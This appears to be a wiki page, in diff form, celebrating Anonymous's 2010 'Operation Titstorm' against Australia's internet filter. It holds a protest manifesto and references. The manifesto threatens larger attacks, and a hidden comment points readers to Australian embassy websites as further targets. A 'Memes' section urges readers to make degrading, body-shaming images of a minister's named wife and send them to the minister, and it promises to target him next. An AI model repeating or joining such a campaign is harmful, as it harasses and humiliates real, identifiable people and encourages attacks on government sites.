+The fact is that "banned" content can be posted on ANY website, at any time; introducing these tools is only a way to silence the selected few. Once the tools are put into place, they can and will be abused, as it has happened throughout history. Costs to taxpayers are estimated to be $44.2 million. This money could be put to far better use. Furthermore, the creation of such an announced filter is in direct violation of the Universal Declaration of Human Rights Charter of 1948, Article 19; which states: "Everyone has the right of opinion and expression; this right includes freedom to hold opinions without interference and to seek, receive and impart information and ideas through any media and regardless of frontiers."
+
+No democratic government should ever favour one community's views over others, be it religious, political or otherwise; it is discriminatory toward minority groups. This censorship has been nothing more than a modern day prohibition and attack against freedoms that the Australian populace previously enjoyed.
+
+We will not back down until this illicit censorship has been removed; the freedoms and rights of the Australian public must be restored. Further attacks will continue on a much larger scale in a wide variety of forms. Attempts to stop us will only bring more negative publicity to this internet censorship campaign and make the Australian government look disgraceful in the eyes of the international public.
+
+====The Undersigned====
+<center>''We are Anonymous.''
+''We do not forgive.''
+''We do not forget.''
+''We are Legion.''
+''Expect us.''</center>
+
+====References====
+
+*"Broadband, Communications and Digital  Economy Minister Stephen Conroy admitted the Federal Government's $44.2  million internet censorship plan...(http://www.news.com.au/technology/australia-to-become-net-nanny-state/story-e6frfro0-1111117886418)
+*"In May 2008, the Government said it  would spend $125.8 million over four years on several measures to  strengthen cyber safety, including the filter." http://www.abc.net.au/news/stories/2009/12/15/2772467.htm
+*Universal Declaration of Human Rights http://www.un.org/en/documents/udhr/ (specifically articles 1, 2, 3, 18, 19 and 26)
+*"But about half of the sites on the list are not related to child porn and include a slew of online poker sites, YouTube links, regular gay and straight porn sites, Wikipedia entries, euthanasia sites, websites of fringe religions such as satanic sites, fetish sites, Christian sites, the website of a tour operator and even a Queensland dentist. (http://www.smh.com.au/articles/2009/03/19/1237054961100.html)
+
+<!--==Credits==
+*[[Operation Titstorm]] is a collective effort by all of Anonymous in every continent and most every country.  Today is was Australia. Tomorrow it might be Canada, the United States, Britain or any other country where the Lulz currently shine.
+
+ To whit, you can get a list of Ausfalian embassy websites [http://www.embassy.gov.au/ here]. Or [http://www.australiatravelsearch.com.au/trc/ozemb.html here] if that government site is down. -->
+
+
+== Memes ==
+[[File:Operation-Titstorm-MICHAEL-JACKSON-IS-ALIVE-AND-WELL.jpg|thumb|left|Wacko Jacko: He's Baaack!]]
+[[File:Operation-Titstorm-MY-HUSBAND-HATES-WOMEN-BECAUSE-I-WAS-DIAGNOSED-WITH-OVARIAN-CANCER-AND-REQUIRED-A.jpg|thumb|MY HUSBAND HATES WOMEN...BECAUSE I'M BARREN!]]
+*Make Stephen Conroy butthurt! Turn his flat-chested wife into a meme! http://is.gd/89PCR
+*Example: http://memegenerator.net/Instances/762/Operation-titstorm-Paula-Benson-Stephen-Conroy-omgitsaninja-Australia-an0n-anonymous-THE-ITTY-BITTY.jpg
+**[[Paula Benson Is Now A Meme]]: done! Keep the shoops coming and be sure to send Stephen plenty of these pics.
+**[[Stephen Conroy]] is currently a redirect. Tomorrow I'll start on him. There's some [http://www.abc.net.au/local/stories/2008/09/05/2356444.htm juicy material] out there.
+
+===Other Targets===
+Since the ban on female ejaculation is incredibly sexist, a letter writing campaign to Australian wimmens' organizations [[:File:Titstorm_2010-02-10_at_7.41.13_PM.png|is underway]].
+A list of such orgs can be found [http://www.nwjc.org.au/womensorgs.html here].
+
+==Credits==
+*[[Operation Titstorm]] is a collective effort by all of Anonymous in every continent and most every country.  Today it was Australia. Tomorrow it might be Canada, the United States, Britain or any other country where the Lulz currently shine.
+
+===Encyclopedia Dramatica===
+*You can show your support by visiting Encyclopedia Dramatica.
+<center>[[Image: Ency.gif]]</center>
+*Please make an account, edit and add articles, and do your part to keep the site active.
+:[http://encyclopediadramatica.com/index.php?title=Special:UserLogin&type=signup http://encyclopediadramatica.com/index.php?title=Special:UserLogin&type=signup]
+
+
+----
+{{serious}}
+{{chans}}
+{{australia}}
+[[Category:Chans]]
+[[Category:Drama-generating techniques]]
+[[Category:2010]]
